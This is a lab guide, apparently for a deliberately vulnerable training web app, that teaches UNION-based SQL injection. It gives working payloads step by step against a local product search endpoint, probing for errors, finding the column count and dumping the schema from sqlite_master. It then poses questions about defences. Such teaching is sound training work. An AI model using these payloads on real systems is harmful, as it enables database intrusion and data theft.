# Challenge 10 — Exfiltrate the Database Schema

| | |
|---|---|
| **Category** | SQL Injection |
| **Difficulty** | ⭐⭐⭐ (3 / 6) |
| **Key Concept** | UNION SELECT & error disclosure |

---

## Objective

Use SQL Injection on the product search endpoint to extract the **entire database schema** — every table name and column definition — using a UNION SELECT attack.

---

## Scenario

In Challenges 4, 6, and 7 you exploited SQL Injection on the login form. That endpoint returned a binary result: either you were logged in or you weren't. You could manipulate the query logic, but you couldn't **see** arbitrary data from the database.

The product search endpoint is different. It takes your search term, runs a SQL query, and **returns the results directly in the HTTP response** as a JSON array of products. This opens the door to a much more powerful technique: **UNION SELECT injection**.

A UNION SELECT lets you append a second query to the original one. If you match the number of columns, the database will combine the results — and you can pull data from **any table**, not just the Products table. Your target is `sqlite_master`, a system table that every SQLite database contains, which stores the `CREATE TABLE` statements (schema definitions) for every table in the database.

---

## Instructions

### Step 1 — Confirm the injection point

1. Open your browser and navigate directly to the search API:
   ```
   http://localhost:3000/rest/products/search?q=apple
   ```
   You should see a JSON response with product data.

2. Now inject a single quote to test for SQL Injection:
   ```
   http://localhost:3000/rest/products/search?q='
   ```
3. Observe the error message. It should reveal:
   - The **SQL query structure** (including the table name and column references)
   - The **database engine**: SQLite
   - A `SQLITE_ERROR` with details about the syntax problem

### Step 2 — Break out of the query

4. The error message reveals that the query uses **double parentheses** around the search term. Try:
   ```
   http://localhost:3000/rest/products/search?q='))--
   ```
5. If successful, this should return **all products** (including logically deleted ones), because the `--` comments out the `AND deletedAt IS NULL` filter.

### Step 3 — Determine the column count

6. A UNION SELECT requires both queries to return the **same number of columns**. Start guessing:
   ```
   ')) UNION SELECT 1--
   ')) UNION SELECT 1,2--
   ')) UNION SELECT 1,2,3--
   ...
   ```
7. Keep adding columns until the error changes from "SELECTs to the left and right of UNION do not have the same number of result columns" to a successful response. The correct number is **9**.

### Step 4 — Extract the schema

8. Now craft the payload to pull schema definitions from `sqlite_master`. Place the `sql` column (which contains the CREATE TABLE statements) in position 2 or 3, because those positions map to visible fields (product name and description) in the JSON response:
   ```
   ')) UNION SELECT 1,sql,3,4,5,6,7,8,9 FROM sqlite_master--
   ```
9. Examine the results. You should see `CREATE TABLE` statements for every table in the database mixed in with the normal product results.

### Step 5 — Clean up the output (optional)

10. To suppress normal product results and only see the schema data, prefix with a non-existent product:
    ```
    nonexistent')) UNION SELECT 1,sql,3,4,5,6,7,8,9 FROM sqlite_master--
    ```

---

## Hints

<details>
<summary>Hint 1 — Reading the error messages</summary>
When you inject a single quote, the error response will contain something like:

```
SQLITE_ERROR: unrecognized token: "..."
```

And it may show the full query:

```sql
SELECT * FROM Products WHERE ((name LIKE '%<input>%' OR description LIKE '%<input>%') AND deletedAt IS NULL) ORDER BY name
```

This tells you:
- The table is `Products`
- Your input appears inside `'%..%'` with double parentheses
- There's a `deletedAt IS NULL` filter you need to comment out
</details>

<details>
<summary>Hint 2 — Why 9 columns?</summary>
The Products table has 9 columns. A UNION SELECT must return the same number. You can verify this by looking at the JSON response for a normal search — count the fields per product object (id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt = 9).
</details>

<details>
<summary>Hint 3 — What is sqlite_master?</summary>
<code>sqlite_master</code> is a special system table present in every SQLite database. It has columns: <code>type</code>, <code>name</code>, <code>tbl_name</code>, <code>rootpage</code>, and <code>sql</code>. The <code>sql</code> column contains the full <code>CREATE TABLE</code> statement for each table, including all column names and types — essentially the entire database schema.
</details>

---

## Questions

1. **What information did the error messages reveal?** List every piece of useful data you extracted from the initial error response (table name, query structure, database engine, etc.).
2. **Why are verbose error messages a security risk?** What should the application return instead when a query fails?
3. **What is `sqlite_master`** and why does it exist in every SQLite database? Do other database engines have equivalents? (Research: what are they called in MySQL and PostgreSQL?)
4. **List the tables you discovered** in the schema dump. Which ones look like high-value targets for an attacker? Why?
5. **Explain the UNION SELECT technique** in your own words:
   - What does UNION do in SQL?
   - Why must the column count match?
   - How did you choose which position (1–9) to place the `sql` column in?
6. **Name three defenses** that could have prevented this attack:
   - One at the **code level**
   - One at the **error handling level**
   - One at the **database permissions level**

---

## Key Concept: UNION SELECT Injection

A normal search query returns product data:

```sql
SELECT * FROM Products WHERE name LIKE '%apple%' ...
-- Returns: id, name, description, price, ... (9 columns of product data)
```

A UNION SELECT injection appends a second query:

```sql
SELECT * FROM Products WHERE name LIKE '%nonexistent'))
UNION
SELECT 1,sql,3,4,5,6,7,8,9 FROM sqlite_master--
-- Returns: 9 columns of schema data disguised as product rows
```

The database executes both queries, combines the results, and returns them as one result set. The application displays them as "products" — but the data is actually the database schema.

```
Normal query result:    ┌──────────────────────────────────────┐
                        │ id │ name        │ description │ ... │
                        │  1 │ Apple Juice │ The all-... │ ... │
                        └──────────────────────────────────────┘
                                          +
UNION injected result:  ┌──────────────────────────────────────┐
                        │  1 │ CREATE TABLE Users (id INT, │ 3 │
                        │  1 │ CREATE TABLE Products (...) │ 3 │
                        │  1 │ CREATE TABLE Feedbacks (...) │ 3│
                        └──────────────────────────────────────┘
                                          =
Combined result:        All of the above displayed as "products"
```

**Why this is devastating:** The attacker now knows every table name and every column name in the database. This is the **reconnaissance step** that enables the next attack — targeted data exfiltration (Challenge 11).

---

## Attack Chain So Far

```
Challenge 1: Found the Score Board (recon)
       │
Challenge 4: Discovered SQLi on login form (authentication bypass)
       │
Challenge 6–7: Targeted specific user accounts (precision attacks)
       │
Challenge 10: Extracted full database schema (intelligence gathering)  ◀── YOU ARE HERE
       │
Challenge 11: Dump all user credentials (data theft)  ◀── NEXT
```

Each challenge builds on the previous ones. An attacker in the real world follows this same escalation path: discover → probe → exploit → enumerate → exfiltrate.

---

## Learning Outcome

Learn **UNION-based SQL Injection** — a technique for extracting arbitrary data from a database through an endpoint that returns query results to the user. Understand how **error messages assist attackers** by revealing query structure, table names, and database engine details. Recognize that **information disclosure through error handling** must be controlled — production applications should return generic error messages, not SQL debug output.

---

[← Back to Index](index.md) | [Previous: Challenge 9](challenge-09-api-xss.md) | [Next: Challenge 11 — Retrieve All User Credentials →](challenge-11-credential-theft.md)
